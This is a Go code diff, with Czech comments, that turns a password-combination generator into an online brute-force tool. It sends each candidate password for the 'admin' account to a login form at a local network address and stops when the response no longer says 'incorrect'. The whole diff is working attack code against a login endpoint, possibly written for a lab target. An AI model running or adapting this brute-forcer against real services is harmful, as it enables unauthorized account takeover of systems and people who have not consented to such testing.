@@ -2,36 +2,67 @@ package main
 
 import (
 	"fmt"
+	"io/ioutil"
+	"net/http"
+	"net/url"
+	"strings"
 )
 
-func nextLetter (login []rune, count []rune, place []int) {
+func nextLetter(login []rune, count []rune, place []int, channel chan []rune) {
 
-	x := 1;
-	for index:=0 ; index<x; index++ {
+	for {
 
-		//zarazi pripadny presah indexu
-		if x==12 {break
-		} else if login[index]==count[61] {
-			login[index]=count[0]
-			place[index]=0
-			x++
+		x := 1
+		for index := 0; index < x; index++ {
 
-		} else {
-			login[index]=count[place[index] +1]
-			place[index]++
+			//zarazi pripadny presah indexu
+			if x == 12 {
+				break
+			} else if login[index] == count[61] {
+				login[index] = count[0]
+				place[index] = 0
+				x++
+
+			} else {
+				login[index] = count[place[index]+1]
+				place[index]++
+			}
 		}
+		channel <- login
 	}
 }
 
-func setup (login []rune, count []rune, place []int) {
+func setup(login []rune, count []rune, place []int) {
 
-	for i :=0 ; i<12; i++ {
-		place[i]=-1
-		login[i]=0
+	for i := 0; i < 12; i++ {
+		place[i] = -1
+		login[i] = 0
 	}
 	//nastavi prvni hodnoty
-	place[0]=0
-	login[0]=count[0]
+	place[0] = 0
+	login[0] = count[0]
+}
+
+func communication(channel chan []rune) {
+
+	for {
+		login := <-channel
+
+		//fmt.Println(string(login))
+		response, err := http.PostForm("http://192.168.0.52:9000/login", url.Values{"login": {"admin"}, "password": {string(login)}})
+
+		if err != nil {
+			fmt.Println("neco se stalo: ", err.Error())
+		}
+
+		bytes, _ := ioutil.ReadAll(response.Body)
+		response.Body.Close()
+
+		if !strings.Contains(string(bytes), "incorrect") {
+			fmt.Println(string(bytes), string(login))
+			break
+		}
+	}
 }
 
 func main() {
@@ -42,12 +73,10 @@ func main() {
 
 	login := make([]rune, 12, 12)
 	place := make([]int, 12, 12)
+	channel := make(chan []rune)
 
 	setup(login, count, place)
 
-	for x :=0 ; x<500000000 ; x++ {
-		nextLetter(login, count, place)
-		fmt.Println(string(login),x)
-		//time.Sleep(5000000)
-	}
+	go nextLetter(login, count, place, channel)
+	communication(channel)
 }
